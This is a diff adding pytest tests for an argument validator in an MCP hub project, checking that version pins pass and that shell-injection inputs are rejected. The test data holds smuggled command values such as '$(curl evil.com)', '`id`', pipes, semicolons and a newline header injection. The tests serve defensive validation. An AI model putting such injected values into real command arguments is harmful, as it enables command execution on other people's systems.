@@ -2,6 +2,7 @@ import pytest
 from src.mcp_hub.validators import (
     ValidationError,
     bearer_headers_from_env,
+    validate_args,
     validate_command, validate_url, validate_env, validate_headers,
     validate_server_config,
     validate_server_name,
@@ -41,6 +42,42 @@ class TestValidateCommand:
     def test_empty_blocked(self):
         with pytest.raises(ValidationError):
             validate_command("")
+
+
+class TestValidateArgs:
+    def test_version_pin_lt_passes(self):
+        """'<' は正当入力（version 範囲ピン mcp<2.0.0 は stdio exec でシェル非経由）。"""
+        args = ["--from", "grok-mcp", "--with", "mcp<2.0.0", "grok-mcp"]
+        assert validate_args(args) == args
+
+    def test_version_range_gt_passes(self):
+        """'>' も正当入力（pkg>=1 / pkg>=1,<2 の範囲指定）。"""
+        args = ["--with", "pkg>=1,<2"]
+        assert validate_args(args) == args
+
+    def test_semicolon_blocked(self):
+        with pytest.raises(ValidationError, match="contains forbidden character"):
+            validate_args(["a;b"])
+
+    def test_pipe_blocked(self):
+        with pytest.raises(ValidationError, match="contains forbidden character"):
+            validate_args(["a|b"])
+
+    def test_backtick_blocked(self):
+        with pytest.raises(ValidationError, match="contains forbidden character"):
+            validate_args(["`id`"])
+
+    def test_subshell_blocked(self):
+        with pytest.raises(ValidationError, match="contains subshell execution"):
+            validate_args(["$(curl evil.com)"])
+
+    def test_newline_blocked(self):
+        with pytest.raises(ValidationError, match="contains control characters"):
+            validate_args(["ok\nX-Injected: evil"])
+
+    def test_nul_blocked(self):
+        with pytest.raises(ValidationError, match="contains control characters"):
+            validate_args(["a\x00b"])
 
 
 class TestValidateUrl:
